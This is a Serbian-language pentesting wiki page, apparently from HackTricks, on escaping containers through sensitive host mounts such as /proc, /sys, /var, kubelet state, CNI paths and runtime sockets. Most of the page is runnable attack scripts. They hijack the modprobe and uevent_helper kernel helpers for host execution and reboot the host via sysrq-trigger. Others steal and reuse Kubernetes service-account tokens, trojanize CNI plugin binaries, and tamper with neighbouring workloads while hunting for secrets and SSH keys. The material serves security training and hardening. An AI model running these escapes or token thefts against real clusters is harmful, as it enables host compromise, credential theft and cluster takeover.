# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Host mounts su jedna od najvažnijih praktičnih površina za container-escape, jer često ruše pažljivo izolovan pogled procesa i vraćaju direktnu vidljivost host resursa. Opasni slučajevi nisu ograničeni na `/`. Bind mounts od `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state ili path-ove vezane za uređaje mogu otkriti kernel kontrole, credentials, susedne filesysteme kontejnera i runtime management interfejse.

Ova stranica postoji odvojeno od pojedinačnih stranica o zaštiti zato što je model zloupotrebe ukršten. Writable host mount je opasan delom zbog mount namespaces, delom zbog user namespaces, delom zbog AppArmor ili SELinux pokrivenosti, i delom zbog toga koji je tačno host path bio izložen. Posmatranje ovoga kao zasebne teme mnogo olakšava razumevanje attack surface-a.

## `/proc` Exposure

procfs sadrži i obične informacije o procesima i visoko-impaktne kernel control interfejse. Bind mount kao `-v /proc:/host/proc` ili container view koji izlaže neočekivane writable proc unose zato može dovesti do information disclosure, denial of service, ili direktnog host code execution.

Visokovredni procfs path-ovi uključuju:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Počnite tako što ćete proveriti koji visoko-vredni procfs unosi su vidljivi ili writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ovi path-ovi su zanimljivi iz različitih razloga. `core_pattern`, `modprobe`, i `binfmt_misc` mogu postati host code-execution path-ovi kada su writable. `kallsyms`, `kmsg`, `kcore`, i `config.gz` su moćni reconnaissance izvori za kernel exploitation. `sched_debug` i `mountinfo` otkrivaju process, cgroup, i filesystem kontekst koji može pomoći da se rekonstruiše host raspored iznutra iz container-a.

Praktična vrednost svakog path-a je različita, i tretiranje svih kao da imaju isti impact otežava triage:

- `/proc/sys/kernel/core_pattern`
Ako je writable, ovo je jedan od procfs path-ova sa najvećim impact-om jer će kernel izvršiti pipe handler nakon crash-a. Container koji može da usmeri `core_pattern` na payload sačuvan u svom overlay-u ili na mounted host path-u često može da dobije host code execution. Pogledajte i [read-only-paths.md](protections/read-only-paths.md) za namenski primer.
- `/proc/sys/kernel/modprobe`
Ovaj path kontroliše userspace helper koji kernel koristi kada treba da pozove module-loading logiku. Ako je writable iz container-a i interpretiran u host kontekstu, može postati još jedna host code-execution primitive. Posebno je zanimljiv kada se kombinuje sa načinom da se helper path pokrene.
- `/proc/sys/vm/panic_on_oom`
Ovo obično nije čista escape primitive, ali može pretvoriti memory pressure u host-wide denial of service tako što OOM uslove pretvara u kernel panic ponašanje.
- `/proc/sys/fs/binfmt_misc`
Ako je registration interface writable, attacker može registrovati handler za izabranu magic vrednost i dobiti execution u host kontekstu kada se izvrši odgovarajući file.
- `/proc/config.gz`
Korisno za kernel exploit triage. Pomaže da se utvrdi koji su subsistemi, mitigations, i opcionalne kernel funkcije omogućeni bez potrebe za host package metadata.
- `/proc/sysrq-trigger`
Uglavnom denial-of-service path, ali veoma ozbiljan. Može odmah reboot-ovati, izazvati panic, ili na drugi način poremetiti host.
- `/proc/kmsg`
Otkriva kernel ring buffer poruke. Korisno za host fingerprinting, crash analysis, a u nekim okruženjima i za leak-ovanje informacija korisnih za kernel exploitation.
- `/proc/kallsyms`
Vredan kada je readable jer otkriva exportovane kernel symbol informacije i može pomoći da se poraze assumptions o address randomization tokom razvoja kernel exploita.
- `/proc/[pid]/mem`
Ovo je direktan process-memory interface. Ako je ciljnom procesu moguće pristupiti sa potrebnim ptrace-style uslovima, može omogućiti čitanje ili menjanje memorije drugog procesa. Realan impact zavisi jako od credentials, `hidepid`, Yama, i ptrace restrikcija, pa je ovo moćan ali uslovan path.
- `/proc/kcore`
Otkriva core-image-style prikaz system memory. File je ogroman i nezgodan za upotrebu, ali ako je smisleno readable, to ukazuje na loše izloženu host memorijsku površinu.
- `/proc/kmem` and `/proc/mem`
Istorijski high-impact raw memory interface-ovi. Na mnogim modernim sistemima su disabled ili jako restricted, ali ako postoje i mogu da se koriste, treba ih tretirati kao critical findings.
- `/proc/sched_debug`
Leaka scheduling i task informacije koje mogu otkriti host process identitete čak i kada drugi process prikazi izgledaju čistije nego što se očekuje.
- `/proc/[pid]/mountinfo`
Izuzetno korisno za rekonstruisanje gde container zaista živi na host-u, koji path-ovi su overlay-backed, i da li writable mount odgovara host sadržaju ili samo container layer-u.

Ako je `/proc/[pid]/mountinfo` ili overlay detalje moguće pročitati, iskoristite ih da povratite host path container filesystem-a:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ove komande su korisne zato što brojne host-execution tehnike zahtevaju pretvaranje puta unutar containera u odgovarajući put iz perspektive hosta.

### Full Example: `modprobe` Helper Path Abuse

Ako je `/proc/sys/kernel/modprobe` upisiv iz containera i ako se helper path tumači u kontekstu hosta, može se preusmeriti na payload pod kontrolom napadača:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tačan okidač zavisi od targeta i ponašanja kernela, ali važna poenta je da zapisiv helper path može preusmeriti buduće pozivanje kernel helper-a ka attacker-controlled host-path sadržaju.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Ako je cilj procena exploitability-ja, a ne odmahni escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ove komande pomažu da se odgovori da li je korisna informacija o simbolima vidljiva, da li nedavne kernel poruke otkrivaju zanimljivo stanje i koje su kernel funkcije ili mitigacije kompajlirane. Uticaj obično nije direktan escape, ali može znatno skratiti kernel-vulnerability triage.

### Full Example: SysRq Host Reboot

Ako je `/proc/sysrq-trigger` upisiv i dostiže host view:
```bash
echo b > /proc/sysrq-trigger
```
Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da procfs exposure može biti mnogo ozbiljniji od informacijskog disclosure-a.

## `/sys` Exposure

sysfs izlaže velike količine kernel i device stanja. Neki sysfs path-ovi su uglavnom korisni za fingerprinting, dok drugi mogu uticati na helper execution, ponašanje device-a, security-module konfiguraciju ili firmware stanje.

High-value sysfs path-ovi uključuju:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ovi path-ovi su važni iz različitih razloga. `/sys/class/thermal` može uticati na thermal-management ponašanje i samim tim na stabilnost hosta u loše exposed okruženjima. `/sys/kernel/vmcoreinfo` može leak-ovati crash-dump i kernel-layout informacije koje pomažu pri niskonivovskom host fingerprinting-u. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, pa neočekivan pristup tamo može otkriti ili izmeniti MAC-related stanje. EFI variable path-ovi mogu uticati na firmware-backed boot podešavanja, što ih čini mnogo ozbiljnijim od običnih configuration fajlova. `debugfs` pod `/sys/kernel/debug` je posebno opasan jer je namerno developer-oriented interfejs sa mnogo manje safety očekivanja nego hardened production-facing kernel APIs.

Korisne review komande za ove path-ove su:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Šta čini te komande zanimljivim:

- `/sys/kernel/security` može otkriti da li su AppArmor, SELinux ili neka druga LSM površina vidljivi na način koji je trebalo da ostane samo na hostu.
- `/sys/kernel/debug` je često najalarmantniji nalaz u ovoj grupi. Ako je `debugfs` mountovan i čitljiv ili upisiv, očekujte široku kernel-facing površinu čiji tačan rizik zavisi od omogućenih debug čvorova.
- EFI exposure je ređi, ali ako postoji, ima visok uticaj jer se tiče firmware-backed podešavanja, a ne običnih runtime fajlova.
- `/sys/class/thermal` je uglavnom relevantan za stabilnost hosta i interakciju sa hardverom, a ne za neat shell-style escape.
- `/sys/kernel/vmcoreinfo` je uglavnom izvor za host-fingerprinting i crash-analysis, koristan za razumevanje low-level kernel stanja.

### Full Example: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` upisiv, kernel može da izvrši helper pod kontrolom napadača kada se pokrene `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Razlog zašto ovo radi je to što se helper path tumači iz perspektive hosta. Kada se jednom pokrene, helper radi u host kontekstu umesto unutar trenutnog container-a.

## `/var` Expozicija

Mountovanje host-ovog `/var` u container se često potcenjuje jer ne izgleda toliko dramatično kao mountovanje `/`. U praksi to može biti dovoljno za pristup runtime socket-ovima, container snapshot direktorijumima, kubelet-om upravljanim pod volumenima, projected service-account token-ima i filesystem-ovima susednih aplikacija. Na modernim node-ovima, `/var` je često mesto gde zapravo živi najzanimljivije container stanje sa operativne tačke gledišta.

### Kubernetes Primer

Pod sa `hostPath: /var` često može da čita projected token-e drugih podova i overlay snapshot sadržaj:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ove komande su korisne jer daju odgovor da li mount izlaže samo beznačajne podatke aplikacije ili visokovredne cluster kredencijale. Čitljiv service-account token može odmah pretvoriti lokalno izvršavanje koda u Kubernetes API pristup.

Ako je token prisutan, proverite šta može da dosegne umesto da stanete na otkrivanju tokena:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Uticaj ovde može biti mnogo veći od lokalnog pristupa nodu. Token sa širokim RBAC može pretvoriti montirani `/var` u kompromitaciju celog klastera.

### Docker And containerd Example

Na Docker hostovima relevantni podaci su često pod `/var/lib/docker`, dok na Kubernetes nodovima zasnovanim na containerd-u mogu biti pod `/var/lib/containerd` ili putanjama specifičnim za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ako montirani `/var` izlaže upisiv snapshot sadržaj drugog workload-a, napadač može da izmeni aplikacione fajlove, ubaci web sadržaj ili promeni startup skripte bez diranja trenutne konfiguracije kontejnera.

Konretne ideje za zloupotrebu kada se pronađe upisiv snapshot sadržaj:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ove komande su korisne jer pokazuju tri glavne porodice uticaja mountovanog `/var`: manipulisanje aplikacijama, oporavak tajni i lateralno kretanje u susedne workload-ove.

## Kubelet State, Plugins, And CNI Paths

Mount `/var/lib/kubelet`, `/opt/cni/bin`, ili `/etc/cni/net.d` se često izlaže kroz privileged DaemonSets, CNI agente, CSI node plugine, GPU operatore i storage helper-e. Ove mount tačke je lako odbaciti kao "node plumbing", ali one se nalaze direktno u execution path-u za nove podove i često sadrže kubelet credentials, projected secrets, registration sockets i izvršne host-side plugin binary-je.

Targets visoke vrednosti uključuju:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Korisne komande za pregled su:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Zašto su ovi path-ovi važni:

- `/var/lib/kubelet/pki` može otkriti kubelet client certificates i druge node-local credentials koji se ponekad mogu ponovo iskoristiti protiv API server ili kubelet-facing TLS endpoints, u zavisnosti od dizajna klastera.
- `/var/lib/kubelet/pods` često sadrži projected service-account tokens i mounted Secrets za susedne pods na istom node-u.
- `/var/lib/kubelet/pod-resources/kubelet.sock` je uglavnom reconnaissance surface, ali veoma koristan: otkriva koji pods i containers trenutno koriste GPUs, hugepages, SR-IOV devices i druge oskudne node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, i `/var/lib/kubelet/plugins_registry` otkrivaju koji CSI, DRA i device plugins su instalirani i sa kojim socket-ovima kubelet treba da komunicira. Ako su ti directories writable, a ne samo readable, finding postaje mnogo ozbiljniji.
- `/opt/cni/bin` i `/etc/cni/net.d` se nalaze direktno na path-u za pod-network setup. Writable access tamo često je odloženi host-execution primitive, a ne samo izlaganje konfiguracije.

### Full Example: Writable `/opt/cni/bin`

Ako je host CNI binary directory mounted read-write, zamena plugin-a može biti dovoljna da se dobije host execution sledeći put kada kubelet kreira pod sandbox na tom node-u:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Ovo nije tako neposredno kao montirani `docker.sock`, ali je često realističnije u kompromitovanim Kubernetes infrastructure podovima. Važna stvar je da modifikovani binary kasnije izvršava flow za podešavanje host network-a, a ne trenutni container.


## Runtime Sockets

Sensitive host mounts često uključuju runtime sockets umesto celih direktorijuma. Oni su toliko važni da zaslužuju eksplicitno ponavljanje ovde:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za pune tokove eksploatacije kada je jedan od ovih socket-ova montiran.

Kao brzi prvi obrazac interakcije:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ako jedan od ovih uspe, putanja od "mounted socket" do "start a more privileged sibling container" je obično mnogo kraća nego bilo koja kernel breakout putanja.

## Mount-Related CVEs

Host mountovi se takođe preklapaju sa runtime ranjivostima. Važni nedavni primeri uključuju:

- `CVE-2024-21626` u `runc`, gde procureni directory file descriptor može postaviti working directory na host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` u BuildKit, gde zlonamerni Dockerfiles, frontends i `RUN --mount` tokovi mogu ponovo uvesti host file access, deletion ili elevated privileges tokom buildova.
- `CVE-2024-1753` u Buildah i Podman build tokovima, gde crafted bind mounts tokom builda mogu izložiti `/` read-write.
- `CVE-2025-47290` u `containerd` 2.1.0, gde TOCTOU tokom image unpack može omogućiti da posebno crafted image modifikuje host filesystem tokom pull.

Ove CVEs su ovde važne zato što pokazuju da rukovanje mountovima nije samo pitanje konfiguracije operatera. Sam runtime takođe može da uvede mount-driven escape uslove.

## Checks

Koristite ove komande da brzo pronađete mount exposures najveće vrednosti:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Šta je zanimljivo ovde:

- Host root, `/proc`, `/sys`, `/var`, i runtime sockets su sve nalazi visokog prioriteta.
- Writable proc/sys unosi često znače da mount izlaže host-global kernel kontrole umesto bezbednog container prikaza.
- Mounted `/var` putevi zahtevaju pregled kredencijala i susednih workload-ova, ne samo pregled filesystema.
- Kubelet state direktorijumi i CNI/plugin putanje zaslužuju isti prioritet kao runtime sockets jer često stoje direktno na putanji node-ovog kreiranja podova i distribucije kredencijala.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
